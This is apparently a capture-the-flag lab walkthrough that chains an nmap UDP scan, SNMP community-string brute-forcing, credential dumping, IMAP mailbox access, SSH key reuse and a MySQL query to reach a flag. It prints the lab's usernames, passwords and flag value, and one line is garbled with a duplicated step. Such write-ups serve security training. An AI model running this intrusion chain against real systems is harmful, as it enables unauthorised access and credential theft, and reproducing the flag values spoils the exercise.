# Footprinting Lab — Hard

## Goal
Enumerate SNMP → find credentials → access email (IMAP)

---

## 1. Identify SNMP Service
- Run UDP scan:
  - `sudo nmap -sU -p 161 10.129.18.96`

**Result:**
- `161/udp open snmp`

---

## 2. Brute-force SNMP Community String
- Use onesixtyone:
  - `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.18.96`

**Result:**
- Community string found: `backup`

---

## 3. Dump SNMP Data
- Run:
  - `snmpwalk -v2c -c backup 10.129.18.96`

- Look for credentials in output

**Found:**
- Username: `tom`
- Password: `NMds732Js2761`

---

## 4. Connect to IMAP Server
- Use OpenSSL:
  - `openssl s_client -connect 10.129.18.96:imaps -quiet`

- Wait for:
  - `* OK Dovecot ready`

> Ignore SSL output (normal)

---

## 5. Login to Mailbox
- Enter:
  - `a LOGIN tom NMds732Js2761`

**Result:**
- `OK Logged in`
  
  6still inside the openssl session. Type these commands **one at a time**:

**Type this first:**

```
a SELECT INBOX
```

Wait for it to respond, then type:

```
a FETCH 1 BODY[]
```

---

## 6. Read Email Contents
- Inside OpenSSL session:

1. Select inbox:
   - `a SELECT INBOX`

2. Fetch email:
   - `a FETCH 1 BODY[]`

> This reveals email contents (includes SSH private key)

---

## 7. Save SSH Private Key
- Open new terminal:
  - `nano id_rsa`

- Paste entire key:
  - Starts with: `-----BEGIN OPENSSH PRIVATE KEY-----`
  - Ends with: `-----END OPENSSH PRIVATE KEY-----`

- Save file

---

## 8. Set Permissions
- Secure key:
  - `chmod 600 id_rsa`

---

## 9. SSH Access
- Login as tom:
  - `ssh -i id_rsa tom@10.129.18.96`

**Result:**
- Access gained:
  - `tom@NIXHARD:~$`

---

## 10. Access MySQL
- Run:
  - `mysql -u tom -pNMds732Js2761`

**Result:**
- MySQL shell opens:
  - `mysql>`

---

## 11. Extract Final Credentials
- Select database:
  - `use users;`

- Query user:
  - `SELECT * FROM users WHERE username='HTB';`

**Result:**
- Password found:
  - `cr3n4o7rzse7rzhnckhssncif7ds`

---

## Final Summary (Full Flow)
UDP → SNMP → Bruteforce → Dump → IMAP → Email → SSH key → SSH → MySQL → Flag